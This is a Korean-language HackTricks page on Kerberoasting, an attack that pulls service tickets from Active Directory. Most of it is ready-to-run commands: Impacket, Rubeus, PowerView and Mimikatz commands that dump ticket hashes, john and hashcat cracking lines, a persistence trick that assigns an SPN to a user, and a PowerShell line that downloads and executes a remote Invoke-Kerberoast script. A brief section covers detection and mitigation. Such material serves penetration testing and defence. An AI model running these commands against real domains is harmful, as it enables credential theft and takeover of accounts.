# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급 커뮤니티 도구**를 활용한 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>제로부터 히어로가 되기까지 AWS 해킹을 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 얻으세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## Kerberoast

Kerberoasting은 **Active Directory (AD)**에서 **컴퓨터 계정을 제외한 사용자 계정**으로 운영되는 서비스와 관련된 **TGS 티켓** 획득에 중점을 둡니다. 이러한 티켓의 암호화는 **사용자 암호**에서 유래한 키를 사용하며, **오프라인 자격 증명 크래킹**이 가능합니다. 서비스로 사용되는 사용자 계정은 비어 있지 않은 **"ServicePrincipalName"** 속성으로 표시됩니다.

**Kerberoasting**을 실행하기 위해서는 **TGS 티켓을 요청할 수 있는 도메인 계정**이 필수적이지만, 이 과정은 **특별한 권한**을 요구하지 않으므로 **유효한 도메인 자격 증명**을 가진 누구에게나 접근 가능합니다.

### 주요 포인트:

* **Kerberoasting**은 **AD** 내 **사용자 계정 서비스**를 대상으로 합니다.
* **사용자 암호**에서 유래한 키로 암호화된 티켓은 **오프라인에서 크래킹**될 수 있습니다.
* **ServicePrincipalName**이 비어 있지 않은 서비스를 식별합니다.
* **특별한 권한**이 필요하지 않고, **유효한 도메인 자격 증명**만 있으면 됩니다.

### **공격**

{% hint style="warning" %}
**Kerberoasting 도구**는 공격을 수행하고 **TGS-REQ 요청을 시작할 때 일반적으로** **`RC4 암호화`**를 요청합니다. 이는 **RC4**가 다른 암호화 알고리즘인 AES-128 및 AES-256보다 **약하며** Hashcat과 같은 도구를 사용하여 **오프라인에서 쉽게 크래킹**할 수 있기 때문입니다.\
RC4 (유형 23) 해시는 **`$krb5tgs$23$*`**로 시작하며, AES-256(유형 18)은 **`$krb5tgs$18$*`**로 시작합니다.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
다음은 kerberoastable 사용자 덤프를 포함한 다중 기능 도구입니다:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Kerberoastable 사용자 열거**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **기법 1: TGS를 요청하고 메모리에서 덤프**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **기법 2: 자동 도구**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
TGS를 요청하면 Windows 이벤트 `4769 - Kerberos 서비스 티켓이 요청되었습니다`가 생성됩니다.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축** 및 **자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Cracking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### 지속성

만약 사용자에 대해 충분한 권한이 있다면 **kerberoastable**하게 만들 수 있습니다:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
다음은 **kerberoast** 공격에 유용한 **도구**를 찾을 수 있습니다: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

만약 Linux에서 다음 **오류**를 발견한다면: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** 이는 로컬 시간 때문입니다. 호스트를 DC와 동기화해야 합니다. 몇 가지 옵션이 있습니다:

* `ntpdate <DC의 IP>` - Ubuntu 16.04부터 사용이 중단됨
* `rdate -n <DC의 IP>`

### 완화

Kerberoasting은 취약점이 있는 경우 매우 은밀하게 수행될 수 있습니다. 이러한 활동을 감지하기 위해 **보안 이벤트 ID 4769**에 주의를 기울여야 합니다. 그러나 이 이벤트가 매우 빈번하게 발생하기 때문에 의심스러운 활동을 분리하기 위해 특정 필터를 적용해야 합니다:

* 서비스 이름이 **krbtgt**이 아니어야 합니다. 이는 정상적인 요청입니다.
* **$**로 끝나는 서비스 이름은 제외되어야 합니다. 서비스에 사용되는 기계 계정을 포함하지 않기 위함입니다.
* **machine@domain** 형식으로 된 계정 이름을 제외하여 기계에서의 요청을 필터링해야 합니다.
* 오직 성공적인 티켓 요청만을 고려해야 합니다. 실패 코드가 **'0x0'**인 것으로 식별됩니다.
* **가장 중요한 것은**, 티켓 암호화 유형이 **0x17**이어야 합니다. 이는 Kerberoasting 공격에서 자주 사용됩니다.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
## Kerberoast 위험 완화 방법

* **서비스 계정 암호를 추측하기 어렵도록** 보장하고, **25자 이상**의 길이를 권장합니다.
* **관리형 서비스 계정**을 활용하면 **자동 암호 변경** 및 **위임된 서비스 주체 이름 (SPN) 관리**와 같은 혜택을 누릴 수 있어 이러한 공격에 대한 보안을 강화할 수 있습니다.

이러한 조치를 시행함으로써 조직은 Kerberoasting과 관련된 위험을 크게 줄일 수 있습니다.

## 도메인 계정 없이 Kerberoast

**2022년 9월**, 연구원인 Charlie Clark가 소개한 새로운 시스템 악용 방법이 [exploit.ph](https://exploit.ph/) 플랫폼을 통해 공개되었습니다. 이 방법은 **서비스 티켓 (ST)**을 **KRB\_AS\_REQ** 요청을 통해 획득할 수 있게 해주는데, 이는 어떠한 Active Directory 계정에 대한 제어도 필요로 하지 않습니다. 본질적으로, 특정 주체가 사전 인증을 필요로 하지 않도록 설정된 경우에 이러한 특성을 이용하여 요청 프로세스를 조작할 수 있습니다. 구체적으로, 요청 본문 내의 **sname** 속성을 변경함으로써 시스템이 표준 암호화된 Ticket Granting Ticket (TGT) 대신 **ST**를 발급하도록 속일 수 있습니다.

이 기술에 대한 자세한 내용은 다음 기사에서 확인할 수 있습니다: [Semperis 블로그 게시물](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
이 기술을 사용하기 위해 LDAP을 쿼리할 유효한 계정이 없으므로 사용자 목록을 제공해야 합니다.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## 참고 자료

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹을 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나**트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **해킹 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출하세요.**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축하고 자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
